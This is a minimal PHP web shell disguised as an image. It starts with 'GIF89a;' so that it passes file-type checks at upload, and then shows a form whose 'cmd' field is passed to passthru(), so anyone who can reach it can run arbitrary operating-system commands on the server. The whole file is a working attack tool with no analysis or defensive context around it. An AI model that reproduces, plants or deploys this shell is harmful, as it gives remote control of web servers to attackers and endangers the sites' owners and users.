GIF89a;

<html>

<body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre style="background-color: #0f0;">
<?php
if (isset($_GET['cmd'])) {
    passthru($_GET['cmd']);
}
?>
</pre>
</body>

</html>